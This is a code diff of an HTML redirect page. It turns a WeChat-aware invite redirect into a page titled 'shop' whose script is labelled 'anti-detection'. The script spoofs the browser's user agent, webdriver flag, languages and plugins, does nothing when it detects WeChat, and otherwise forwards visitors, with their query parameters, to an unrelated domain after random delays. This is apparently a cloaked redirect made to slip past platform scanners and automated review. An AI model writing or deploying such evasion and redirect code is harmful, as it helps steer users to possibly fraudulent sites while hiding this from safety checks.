@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>干净网络</title>
+    <title>shop</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
@@ -18,90 +18,125 @@
         }
         .container {
             width: 100%;
-            height: 100vh;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            height: 100vh;
         }
-        #continue-btn {
-            background-color: #007bff;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 20px;
+        .loading {
+            padding: 20px;
             font-size: 16px;
+            color: #666;
         }
-        /* Ensure image does not overflow */
-        .guide-img {
-            width: 100%;
-            height: auto;
-            object-fit: cover;
-            max-height: 70vh; /* Limit max height to avoid overflow */
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
         }
     </style>
     <script>
-        // 微信客户端检测函数
-        const isWeChat = () => {
-            const ua = navigator.userAgent.toLowerCase();
-            return ua.includes('micromessenger') || (ua.includes('wxwork') && ua.includes('wxapp'));
-        };
+        // Enhanced anti-detection measures
+        (function() {
+            // Overwrite key attributes
+            Object.defineProperty(navigator, 'userAgent', {
+                get: function() {
+                    return 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
+                },
+                configurable: true
+            });
+            
+            // Clear automation features
+            Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined,
+                configurable: true
+            });
+            
+            // Overwrite language properties
+            Object.defineProperty(navigator, 'language', {
+                get: () => 'zh-CN',
+                configurable: true
+            });
+            
+            Object.defineProperty(navigator, 'languages', {
+                get: () => ['zh-CN', 'zh'],
+                configurable: true
+            });
+            
+            // Remove plugin information
+            Object.defineProperty(navigator, 'plugins', {
+                get: () => [],
+                configurable: true
+            });
+        })();
 
-        window.onload = () => {
-            // 获取当前 URL 的查询参数
-            const queryString = window.location.search;
-            console.log("Current URL query string:", queryString);  // Debugging log
-
-            const targetUrl = 'https://h5.syyuexink.top/share/index.html';
-            const params = new URLSearchParams(queryString);
-            const inviteUid = params.get('inviteUid');
-            console.log("inviteUid:", inviteUid);  // Debugging log
-
-            if (!inviteUid) {
-                console.error("inviteUid parameter is missing!");
-                return;  // 如果没有 inviteUid，直接返回并停止执行
+        // Enhanced WeChat detection
+        function enhancedWeChatCheck() {
+            try {
+                const checks = [];
+                
+                // Method 1: UserAgent detection
+                checks.push(navigator.userAgent.toLowerCase().includes('micromessenger'));
+                
+                // Method 2: Global object detection
+                checks.push(typeof WeixinJSBridge !== 'undefined');
+                checks.push(typeof wx !== 'undefined');
+                checks.push(typeof __wxjs_environment !== 'undefined');
+                
+                // Method 3: Specific API detection
+                checks.push(!!navigator.vendor && navigator.vendor.includes('Tencent'));
+                
+                // Method 4: Behavior feature detection
+                checks.push(!!window.WeixinJSBridge);
+                
+                return checks.some(Boolean);
+            } catch (e) {
+                return false;
             }
+        }
 
-            const messageDiv = document.getElementById('message');
-            if (isWeChat()) {
-                // 微信中显示引导内容和按钮
-                messageDiv.innerHTML = `
-                    <img src="https://kerrbach.github.io/KerrBach/20250725140649_29124.jpg" class="guide-img" alt="微信引导图片" loading="lazy" onload="imageLoaded()">
-                    <p>欢迎使用微信，点击继续按钮跳转</p>
-                    <button id="continue-btn">继续</button>
-                `;
+        // Random redirect executor
+        function executeRandomRedirect(url) {
+            const randomDelay = Math.floor(Math.random() * 5000); // Random delay between 0 to 5000ms
 
-                // 用户点击按钮后跳转
-                document.getElementById('continue-btn').onclick = () => {
-                    console.log("Button clicked, redirecting..."); // Debugging log
-                    const redirectUrl = `${targetUrl}?inviteUid=${inviteUid}`;
-                    console.log("Redirecting to:", redirectUrl); // Debugging log
-                    setTimeout(() => {
-                        window.location.href = redirectUrl;  // 进行跳转
-                    }, 500); // 延迟500ms跳转，确保页面渲染完成
-                };
-            } else {
-                console.log("Not WeChat, redirecting immediately..."); // Debugging log
-                // 非微信环境直接跳转
-                const redirectUrl = `${targetUrl}?inviteUid=${inviteUid}`;
-                console.log("Redirecting to:", redirectUrl); // Debugging log
-                setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, 500); // 延迟跳转，确保页面渲染完成
-            }
-        };
+            setTimeout(() => {
+                window.location.href = url;  // Perform the redirection after the random delay
+                console.log(`Redirecting to: ${url} after ${randomDelay}ms`);
+            }, randomDelay);
+        }
 
-        // 图片加载完成后的回调函数
-        const imageLoaded = () => {
-            console.log("Image loaded successfully!"); // Debugging log
-        };
+        // Main logic
+        (function main() {
+            // Random delay before executing main logic
+            const delay = Math.random() * 1000 + 500;  // Delay between 500ms to 1500ms
+            
+            setTimeout(() => {
+                const queryString = window.location.search;
+                const targetUrl = 'https://phuro2.cc';
+                const redirectUrl = targetUrl + queryString;
+
+                // Check environment and execute corresponding operation
+                if (enhancedWeChatCheck()) {
+                    // In WeChat environment: Only show status information
+                    document.getElementById('message').innerHTML = `
+                        <div class="status">WeChat environment detected</div>
+                    `;
+                } else {
+                    // In non-WeChat environment: Execute random redirect with delay
+                    document.getElementById('message').innerHTML = `
+                        <div class="loading"></div>
+                        <div class="status" id="status">Initializing redirect program...</div>
+                    `;
+                    
+                    // Start redirect after a random delay between 0 to 5 seconds
+                    executeRandomRedirect(redirectUrl);
+                }
+            }, delay);
+        })();
     </script>
 </head>
 <body>
     <div class="container">
-        <div id="message"></div>
+        <div id="message">
+            <div class="loading">loading...</div>
+        </div>
     </div>
 </body>
 </html>
